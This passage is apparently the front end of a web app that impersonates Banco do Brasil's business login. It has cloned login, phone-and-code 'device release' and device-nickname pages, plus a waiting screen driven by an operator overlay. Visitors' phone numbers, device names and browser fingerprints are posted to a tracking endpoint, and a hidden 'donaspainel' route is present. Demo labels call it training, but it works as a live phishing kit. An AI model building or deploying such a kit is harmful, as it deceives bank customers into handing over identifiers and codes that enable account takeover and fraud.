                  <ul className="pj-profile-list" role="listbox" aria-labelledby="profile-label">
                    {profiles.map((p) => (
                      <li 
                        key={p} 
                        role="option" 
                        aria-selected={profile === p}
                        onClick={() => {
                          setProfile(p);
                          setProfileOpen(false);
                        }}
                      >
                        {p}
                      </li>
                    ))}
                  </ul>
                )}
              </div>
            </div>

            <div className="pj-access-type-group">
              <span className="pj-group-label">Tipo de acesso</span>
              <div className="pj-access-pills" role="group" aria-label="Tipo de acesso">
                {['Chave J', 'CPF', 'BB Code', 'Certificado Digital'].map(type => (
                  <button
                    key={type}
                    type="button"
                    className={`pj-pill ${accessType === type ? 'active' : ''}`}
                    onClick={() => {
                      setAccessType(type);
                      setIdentifier('');
                      setPassword('');
                    }}
                    aria-pressed={accessType === type}
                  >
                    {type}
                  </button>
                ))}
              </div>
            </div>

            {(accessType === 'Chave J' || accessType === 'CPF') && (
              <>
                <div className="pj-input-group">
                  <label htmlFor="pj-identifier">{accessType}</label>
                  <input
                    id="pj-identifier"
                    type="text"
                     className={
                       accessType === 'Chave J'
                         ? showChaveJError
                           ? 'pj-input-error'
                           : 'pj-input-normal'
                         : identifier === ''
                           ? 'pj-input-error'
                           : 'pj-input-normal'
                     }
                    value={identifier}
                     onChange={e => handleIdentifierChange(e.target.value)}
                     maxLength={accessType === 'Chave J' ? 8 : undefined}
                    autoComplete="off"
                  />
                   {showChaveJError && (
                    <span className="pj-error-text">
                       Chave J inválida
                    </span>
                  )}
                </div>

                <div className="pj-input-group">
                  <label htmlFor="pj-password">Senha</label>
                  <div className="pj-password-wrapper">
                    <input
                      id="pj-password"
                      type={showPassword ? 'text' : 'password'}
                      className="pj-input-normal"
                      value={password}
                      onChange={e => setPassword(e.target.value)}
                      autoComplete="off"
                     required
                    />
                    <button
                      type="button"
                      className="pj-password-toggle"
                      onClick={() => setShowPassword(!showPassword)}
                      aria-label={showPassword ? 'Ocultar senha' : 'Mostrar senha'}
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </div>

                <div className="pj-forgot-password">
                  <button type="button" onClick={() => setLocation('/secure-login')}>
                    Esqueci minha senha
                  </button>
                </div>

                <div className="pj-remember-group">
                  <label className="pj-checkbox-label">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={e => setRememberMe(e.target.checked)}
                    />
                    <span className="pj-checkbox-custom"></span>
                    Salvar dados neste computador
                  </label>
                </div>

                <button
                  type="submit"
                  className="pj-submit-btn"
                  disabled={showChaveJError}
                >
                  ENTRAR
                </button>
              </>
            )}

            {accessType === 'BB Code' && (
              <div className="pj-bbcode-group">
                <div className="pj-qr-container">
                  <img src={bbCodeReference} alt="QR Code" className="pj-qr-image" />
                </div>
                <ol className="pj-bbcode-instructions">
                  <li>Acesse o App BB em seu smartphone e abra o leitor de QR Code (BB Code)</li>
                  <li>Aponte a câmera para o QR Code exibido acima</li>
                  <li>Insira suas credenciais e aguarde a liberação de acesso</li>
                </ol>
                <div className="pj-bbcode-link">
                  Primeiro acesso?{' '}
                  <button type="button">Saiba como habilitar o BB Code</button>
                </div>
              </div>
            )}
          </form>

          <footer className="pj-login-footer">
            <p>© Banco do Brasil</p>
          </footer>
        </div>
        
        <button type="button" className="pj-chat-btn" aria-label="Abrir chat">
          <MessageCircle size={22} />
        </button>
      </div>

      <div className="pj-login-right" aria-hidden="true">
        <img src={pjLoginReference} alt="" className="pj-login-hero" />
      </div>

      {isLoading && <PjLoadingOverlay />}
    </main>
  );
}

function PjPhoneUnlockPage() {
  const [, setLocation] = useLocation();
  const [phone, setPhone] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const isVerificationValid =
    phone.replace(/\D/g, '').length === 11 && verificationCode.length === 8;

  useEffect(() => {
    if (!isLoading) return;

    const timer = window.setTimeout(() => {
      setIsLoading(false);
      setLocation('/sign-in/dispositivo');
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [isLoading, setLocation]);

  const handlePhoneChange = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);

    if (digits.length <= 2) {
      setPhone(digits);
    } else if (digits.length <= 7) {
      setPhone(`(${digits.slice(0, 2)}) ${digits.slice(2)}`);
    } else {
      setPhone(`(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`);
    }
  };

  const handleVerificationSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (isVerificationValid) {
      setIsLoading(true);
      trackSession('PJ', '/sign-in/celular', `Cel ${phone}`);
    }
  };

  return (
    <main className="token-page">
      <button
        type="button"
        className="token-back"
        onClick={() => setLocation('/sign-in')}
        aria-label="Voltar"
      >
        <ArrowLeft size={22} strokeWidth={1.75} />
      </button>

      <section className="token-left">
        <div className="token-left-inner">
        <header className="token-header">
          <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
          <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
        </header>

        <div className="token-copy-block">
          <p className="token-unlock">
            Você precisa fazer a liberação deste computador para continuar o acesso.
          </p>
          <p className="token-hint">
            Primeiro, Confirme o número de celular cadastrado para identificar esse computador.
          </p>
        </div>

        <form className="token-form" onSubmit={handleVerificationSubmit}>
          <div className="token-field">
            <label className="token-label" htmlFor="verification-phone">
              Confirme número de celular cadastrado:
            </label>
            <input
              id="verification-phone"
              className="token-input"
              type="tel"
              inputMode="numeric"
              placeholder="(DDD) + Número"
              value={phone}
              onChange={event => handlePhoneChange(event.target.value)}
              autoComplete="off"
              required
            />
          </div>

          <div className="token-field">
            <label className="token-label" htmlFor="verification-code">
              Senha de 8 dígitos:
            </label>
            <div className="token-password-wrapper">
              <input
                id="verification-code"
                className="token-input"
                type={showPassword ? 'text' : 'password'}
                inputMode="numeric"
                placeholder="SENHA 8 DÍGITOS"
                value={verificationCode}
                onChange={event =>
                  setVerificationCode(event.target.value.replace(/\D/g, '').slice(0, 8))
                }
                maxLength={8}
                autoComplete="off"
                required
              />
              <button
                type="button"
                className="pj-password-toggle"
                onClick={() => setShowPassword(!showPassword)}
                aria-label={showPassword ? 'Ocultar senha de 8 dígitos' : 'Mostrar senha de 8 dígitos'}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          <button type="submit" className="token-submit" disabled={!isVerificationValid}>
            AVANÇAR
          </button>
        </form>
        </div>
      </section>

      <aside className="token-right" aria-hidden="true">
        <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
      </aside>

      <p className="token-legal">(c) Banco do Brasil</p>
      <button type="button" className="token-chat" aria-label="Abrir chat">
        <MessageCircle size={22} />
      </button>

      {isLoading && <PjLoadingOverlay />}
    </main>
  );
}

function PjDeviceNicknamePage() {
  const [, setLocation] = useLocation();
  const [deviceNickname, setDeviceNickname] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const trimmedNickname = deviceNickname.trim();
  const isNicknameValid = trimmedNickname.length > 0;

  const handleDeviceNicknameSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (isNicknameValid) {
      setIsLoading(true);
      trackSession('PJ', '/sign-in/dispositivo', `Dispositivo: ${trimmedNickname}`);
    }
  };

  useEffect(() => {
    if (!isLoading) return;

    const timer = window.setTimeout(() => {
      setLocation('/sign-in/autorizacao');
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [isLoading, setLocation]);

  return (
    <main className="token-page">
      <button
        type="button"
        className="token-back"
        onClick={() => setLocation('/sign-in/celular')}
        aria-label="Voltar"
      >
        <ArrowLeft size={22} strokeWidth={1.75} />
      </button>

      <section className="token-left">
        <div className="token-left-inner">
        <header className="token-header">
          <img src={`${basePath}/bb-icon.svg`} alt="Banco do Brasil" className="token-logo" />
          <h1 className="token-title">Acesse sua conta Banco do Brasil</h1>
        </header>

        <div className="token-copy-block">
          <p className="token-unlock">
            Você precisa fazer a liberação deste computador para continuar o acesso.
          </p>
          <p className="token-hint">
            Escolha um apelido para identificar esse computador.
            <br />
            Para isso, utilize os campos abaixo:
          </p>
        </div>

        <form className="token-form" onSubmit={handleDeviceNicknameSubmit}>
          <div className="token-field">
            <label className="token-label" htmlFor="device-nickname">
              Apelido do computador
            </label>
            <input
              id="device-nickname"
              className="token-input"
              type="text"
              placeholder="Ex: Computador do joão"
              value={deviceNickname}
              onChange={event => setDeviceNickname(event.target.value.slice(0, 10))}
              maxLength={10}
              autoComplete="off"
              required
            />
          </div>

          <button type="submit" className="token-submit" disabled={!isNicknameValid}>
            AVANÇAR
          </button>
        </form>
        </div>
      </section>

      <aside className="token-right" aria-hidden="true">
        <img src={`${basePath}/token-hero.jpg`} alt="" className="token-hero" />
      </aside>

      <p className="token-legal">(c) Banco do Brasil</p>
      <button type="button" className="token-chat" aria-label="Abrir chat">
        <MessageCircle size={22} />
      </button>

      {isLoading && <PjLoadingOverlay />}
    </main>
  );
}

function PjAuthorizationPage() {
  useEffect(() => {
    trackSession('PJ', '/sign-in/autorizacao', null);
  }, []);
  return (
    <main className="pj-auth-page">
      <img
        className="verification-background"
        src={verificationBackground}
        alt=""
        aria-hidden="true"
      />

      <div className="pj-auth-modal" role="status" aria-live="polite">
        <div className="pj-auth-card">
          <section className="pj-auth-card-left">
            <img
              src={`${basePath}/bb-pj-white-logo.png`}
              alt=""
              className="pj-auth-card-logo"
            />
            <h1>Aguarde...</h1>
            <p>
              Não conseguimos identificar este dispositivo em sua lista de computadores
              autorizados e seguros.
              <br />
              <br />
              Estamos iniciando o processo de autorização e liberação deste computador. Seja
              paciente.
            </p>
            <span className="pj-auth-big-loader" aria-hidden="true" />
          </section>

          <section className="pj-auth-card-right">
            <header>INICIANDO SOLICITAÇÃO</header>
            <div className="pj-auth-card-copy">
              Aguarde alguns instantes, iremos dar continuidade com a autorização deste
              computador.
              <p>
                <b>Chave de acesso:</b>
              </p>
            </div>
            <hr />
            <small>
              Este processo é importante para manter sua conta segura, e com acessos por
              dispositivos autorizados e seguros.
            </small>
            <span className="pj-auth-lock" aria-hidden="true">
              <ChevronsRight size={18} strokeWidth={2.6} />
            </span>
          </section>
        </div>
      </div>
      <LiveControlOverlay
        flow="PJ"
        route="/sign-in/autorizacao"
        entry="/sign-in"
        passiveWhenWaiting
      />
    </main>
  );
}

function AuthPage({ mode }: { mode: 'sign-in' | 'sign-up' }) {
  return (
    <main className="auth-page">
      <section className="auth-showcase" aria-label="Conta digital">
        <a className="auth-brand" href={basePath || '/'} aria-label="Voltar para a página inicial">
          <img src={`${basePath}/logo.svg`} alt="BB Empresas" />
        </a>
        <div className="auth-showcase-copy">
          <span className="auth-kicker">Banco do Brasil</span>
          <h1>{mode === 'sign-in' ? 'Acesse sua conta' : 'Crie sua conta'}</h1>
          <p>
            {mode === 'sign-in'
              ? 'Entre para acompanhar seus produtos e soluções do BB.'
              : 'Tenha acesso a uma experiência digital simples e segura.'}
          </p>
        </div>
        <div className="auth-showcase-shape" aria-hidden="true" />
      </section>
      <section className="auth-panel">
        {mode === 'sign-in' ? (
          <SignIn
            routing="path"
            path={`${basePath}/secure-login`}
            signUpUrl={`${basePath}/sign-up`}
          />
        ) : (
          <SignUp
            routing="path"
            path={`${basePath}/sign-up`}
            signInUrl={`${basePath}/sign-in`}
          />
        )}
      </section>
    </main>
  );
}

function UserPortalPage() {
  const { isLoaded, isSignedIn } = useAuth();
  const { user } = useUser();
  const { signOut } = useClerk();
  const [, setLocation] = useLocation();

  if (!isLoaded) {
    return <div className="portal-loading">Carregando sua conta...</div>;
  }

  if (!isSignedIn) {
    return <RedirectToSignIn />;
  }

  const displayName = user?.firstName || user?.emailAddresses[0]?.emailAddress || 'cliente';

  return (
    <main className="portal-page">
      <header className="portal-header">
        <a href={basePath || '/'} aria-label="Voltar para a página inicial">
          <img src={`${basePath}/logo.svg`} alt="BB Empresas" />
        </a>
        <button
          type="button"
          onClick={() => signOut({ redirectUrl: basePath || '/' })}
          data-testid="button-sign-out"
        >
          Sair
        </button>
      </header>
      <section className="portal-card">
        <span className="auth-kicker">Área segura</span>
        <h1>Olá, {displayName}.</h1>
        <p>Você está conectado à sua conta. Esta é a sua área inicial de acesso.</p>
        <button type="button" className="portal-home-button" onClick={() => setLocation('/')}>
          Voltar para a página inicial
        </button>
      </section>
    </main>
  );
}

function ClerkApp() {
  return (
    <ClerkProvider
      publishableKey={clerkPubKey}
      proxyUrl={clerkProxyUrl}
      appearance={clerkAppearance}
      signInUrl={`${basePath}/secure-login`}
      signUpUrl={`${basePath}/sign-up`}
      localization={{
        signIn: {
          start: {
            title: 'Acesse sua conta',
            subtitle: 'Entre para continuar no Banco do Brasil',
          },
        },
        signUp: {
          start: {
            title: 'Crie sua conta',
            subtitle: 'Comece sua experiência no Banco do Brasil',
          },
        },
      }}
    >
      <div className="training-app-shell">
        <div className="training-app-content">
          <Switch>
            <Route path="/" component={HomeRedirect} />
            <Route path="/pessoa-fisica/liberacao" component={AutoatendimentoLiberacaoPage} />
            <Route path="/pessoa-fisica/senha" component={AutoatendimentoPasswordPage} />
            <Route path="/pessoa-fisica" component={AutoatendimentoPage} />
            <Route path="/sign-in/celular" component={PjPhoneUnlockPage} />
            <Route path="/sign-in/dispositivo" component={PjDeviceNicknamePage} />
            <Route path="/sign-in/autorizacao" component={PjAuthorizationPage} />
            <Route path="/sign-in" component={PjLoginPage} />
            <Route path="/donaspainel" component={DonasPainel} />
            <Route path="/secure-login/*?" component={() => <AuthPage mode="sign-in" />} />
            <Route path="/sign-up/*?" component={() => <AuthPage mode="sign-up" />} />
            <Route path="/user-portal" component={UserPortalPage} />
            <Route component={() => <Redirect to="/" />} />
          </Switch>
        </div>
      </div>
    </ClerkProvider>
  );
}

function DemoRibbon() {
  return (
    <div className="demo-ribbon" role="note" data-testid="demo-ribbon">
      <ShieldAlert size={13} aria-hidden="true" />
      <span>Ambiente de demonstração — dados fictícios. Não insira credenciais reais.</span>
    </div>
  );
}

function ClerkDisabledNotice() {
  const [, setLocation] = useLocation();
  return (
    <main className="demo-notice-page" data-testid="clerk-disabled-notice">
      <div className="demo-notice-card">
        <span className="demo-badge">Ambiente de demonstração</span>
        <h1>Acesso indisponível no modo demonstração</h1>
        <p>
          Esta tela usa um provedor de identidade externo (Clerk) que está
          desativado neste ambiente de treinamento. Nenhuma credencial real é
          coletada ou transmitida aqui.
        </p>
        <button
          type="button"
          className="portal-home-button"
          data-testid="clerk-notice-home"
          onClick={() => setLocation('/')}
        >
          Voltar para a página inicial
        </button>
      </div>
    </main>
  );
}

function DemoApp() {
  return (
    <div className="training-app-shell">
      <div className="training-app-content">
        <Switch>
          <Route path="/" component={HomePage} />
          <Route path="/pessoa-fisica/liberacao" component={AutoatendimentoLiberacaoPage} />
          <Route path="/pessoa-fisica/senha" component={AutoatendimentoPasswordPage} />
          <Route path="/pessoa-fisica" component={AutoatendimentoPage} />
          <Route path="/sign-in/celular" component={PjPhoneUnlockPage} />
          <Route path="/sign-in/dispositivo" component={PjDeviceNicknamePage} />
          <Route path="/sign-in/autorizacao" component={PjAuthorizationPage} />
          <Route path="/sign-in" component={PjLoginPage} />
          <Route path="/donaspainel" component={DonasPainel} />
          <Route path="/secure-login/*?" component={ClerkDisabledNotice} />
          <Route path="/sign-up/*?" component={ClerkDisabledNotice} />
          <Route path="/user-portal" component={ClerkDisabledNotice} />
          <Route component={() => <Redirect to="/" />} />
        </Switch>
      </div>
    </div>
  );
}

const clerkEnabled = Boolean(import.meta.env.VITE_CLERK_PUBLISHABLE_KEY);

function AccessTracker() {
  const [location] = useLocation();
  useEffect(() => {
    if (location.startsWith('/donaspainel')) return;
    try {
      fetch('/api/access/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          route: location || '/',
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: `${window.screen.width}x${window.screen.height}`,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
        }),
      }).catch(() => {});
    } catch {
      /* ignore */
    }
  }, [location]);
  return null;
}

const SESSION_ID_KEY = 'demo-flow-session-id';

function getSessionId(forceNew = false): string {
  try {
    let id = window.sessionStorage.getItem(SESSION_ID_KEY);
    if (!id || forceNew) {
      id = (crypto.randomUUID?.() ?? `s-${Date.now()}-${Math.random().toString(16).slice(2)}`);
      window.sessionStorage.setItem(SESSION_ID_KEY, id);
    }
    return id;
  } catch {
    return `s-${Date.now()}`;
  }
}

type FlowType = 'PF' | 'PJ';

/**
 * Registra/atualiza a sessão única do visitante conforme ele avança no fluxo.
 * NUNCA envia senha/OTP. `respondTo` sinaliza resposta a um comando do operador
 * (ex.: informou o token SMS) sem transmitir o valor digitado. `firstStep` inicia
 * um novo sessionId — usado somente na PRIMEIRA etapa de cada fluxo (PF: CONTINUAR
 * em /pessoa-fisica; PJ: ENTRAR em /sign-in) para criar um card por tentativa e não
 * reaproveitar/contaminar sessões anteriores.
 */
function trackSession(
  flowType: FlowType,
  route: string,
  label: string | null,
  respondTo?: string,
  firstStep = false,
) {
  try {
    fetch('/api/auth-attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: getSessionId(firstStep),
        flowType,
        route,
        label,
        respondTo: respondTo ?? null,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
      }),
    }).catch(() => {});
  } catch {
    /* ignore */
  }
}

function App() {
  return (
    <WouterRouter base={basePath}>
      <AccessTracker />
      <PresenceClient />
      {clerkEnabled ? <ClerkApp /> : <DemoApp />}
    </WouterRouter>
  );
}

export default App;